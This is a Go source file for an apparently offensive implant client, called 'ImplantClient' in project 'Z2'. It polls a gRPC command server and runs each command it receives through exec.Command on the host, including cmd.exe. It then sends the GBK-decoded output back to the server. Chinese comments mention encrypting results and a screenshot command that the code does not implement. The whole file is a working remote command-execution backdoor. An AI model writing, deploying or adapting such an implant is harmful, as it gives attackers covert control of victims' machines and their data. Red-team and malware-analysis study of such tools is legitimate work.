package main

import (
	"Z2/protobufapi"
	"context"
	"fmt"

	"google.golang.org/grpc"

	"log"
	//	"os"
	"bytes"
	"io/ioutil"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// "Z2/util"
func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client protobufapi.ImplantClient
	)
	opts = append(opts, grpc.WithInsecure())
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallRecvMsgSize(1024*1024*12)))
	opts = append(opts, grpc.WithDefaultCallOptions(grpc.MaxCallSendMsgSize(1024*1024*12)))

	if conn, err = grpc.Dial(fmt.Sprintf("0.0.0.0:%d", 1961), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = protobufapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(protobufapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			t, _ := client.GetSleepTime(ctx, req)
			fmt.Println("sleep" + t.String())
			time.Sleep(time.Duration(t.Time) * time.Second)
			continue
		}
		//从服务端获取到命令后先进行解密处理
		exec.Command("cmd.exe", "/c", "chcp 65001").Run()
		command := cmd.In
		tokens := strings.Split(string(command), " ")
		//根据输入的命令 进行 一个判断
		//输入的命令为screenshot 就进入下面的流程
		fmt.Println(tokens)
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}

		//buf, err := c.CombinedOutput()

		var out bytes.Buffer
		c.Stdout = &out
		err2 := c.Run()
		if err2 != nil {
			fmt.Println("Error:", err2)
			return
		}

		decoder := simplifiedchinese.GBK.NewDecoder()
		utf8Output, err2 := ioutil.ReadAll(transform.NewReader(&out, decoder))

		//将结果发送给服务端时先进行加密处理
		cmd.Out += string(utf8Output)
		cmd.Out = cmd.Out
		fmt.Println(cmd.In + cmd.Out)
		client.SendOutput(ctx, cmd)
	}
}
